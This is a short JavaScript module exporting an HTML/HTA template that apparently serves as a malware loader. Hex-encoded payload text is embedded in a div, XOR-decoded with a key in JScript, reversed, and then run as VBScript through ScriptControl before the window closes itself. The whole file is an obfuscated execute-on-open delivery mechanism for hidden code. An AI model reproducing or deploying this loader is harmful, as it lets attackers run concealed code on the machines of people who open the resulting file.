module.exports = `<html>

<body id="_b">
    <div id="doc">
        {{payload}}
    </div>
</body>

</html>
<script type='text/jscript'>
    function fx() {
        var d0c = document.getElementById("doc").innerText;
        return d0c;
    }
    function ff(s, k) {
        s = s.split("");
        k = k.split("");
        var __h = "";
        var __d = "";
        for (var i = 0; i < s.length; i++) {

            __h += s[i];

            if (__h.length == 2) {
                __d = __d + String.fromCharCode((parseInt(__h, 16) ^ k[((i - 1) / 2) % k.length].charCodeAt(0)));
                __h = "";
            }
        }
        return __d.split("").reverse().join("");
    }

</script>
<script type='text/vbscript'>
        k = "{{key}}":
        Set sc = CreateObject("ScriptControl"):
        d_c = fx():
        r = ff(d_c, k):
        With sc:
           .Language = "VBScript":
           .AddCode r:
        End With:
        window.close():
</script>`